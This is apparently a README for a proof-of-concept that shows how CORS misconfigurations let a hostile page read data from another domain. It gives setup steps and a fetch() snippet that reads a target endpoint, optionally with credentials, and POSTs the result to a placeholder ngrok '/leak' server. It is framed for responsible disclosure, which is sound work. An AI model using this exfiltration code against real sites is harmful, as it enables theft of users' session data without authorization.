# 🚨 CORS API PoC

This is a **Proof-of-Concept (PoC)** to demonstrate how **Cross-Origin Resource Sharing (CORS)** misconfigurations can allow unauthorized websites to fetch sensitive data from a vulnerable domain.

---

## ⚠️ Disclaimer

- This PoC is for **educational** and **responsible disclosure** purposes **only**.
- Do **not** use it against any system without **explicit permission**.
- The domain `example.com` is used as a **placeholder**.  
  Always replace it with the **actual vulnerable domain** during authorized testing.
- Similarly, replace the **ngrok URL** with your own **controlled server** to collect PoC data during testing.

---

## 🧪 How It Works

1. The HTML page runs a **JavaScript `fetch()` request** to a target endpoint vulnerable to CORS misconfiguration.
2. If the target server allows cross-origin requests without proper validation, the script:
   - **Fetches sensitive data** (even with credentials, if allowed).
   - **Displays it** in the browser.
   - Optionally **sends it** to your own controlled server (e.g., via `ngrok`) for demonstration.

---

## 🛠 Setup Instructions

1. **Clone this repo** or copy `index.html` to your machine.
2. **Replace placeholders** in the script:
   ```js
   fetch("https://example.com/api/v2/status.json", { ... })


🔁 Replace example.com with the actual target domain.

🔁 Replace https://your-ngrok-server.ngrok-free.app/leak with your ngrok or Flask server URL.

Host the HTML file:

GitHub Pages

Local HTTP server (e.g., python3 -m http.server)

Or directly open in browser

View the result:

On successful CORS exploitation, sensitive content will appear in the textarea.

A POST request will be made to your leak endpoint with the response body.   


🧰 Example Use Case (with placeholders)

   fetch("https://example.com/api/v2/status.json", {
  method: "GET"
  // credentials: "include"  // Uncomment if testing for session-based data leaks
});

fetch("https://your-ngrok-server.ngrok-free.app/leak", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ leaked: data })
});


📬 Contact
If you're the security team reviewing this PoC, feel free to reach out via email for clarification or technical questions related to this demonstration.

 
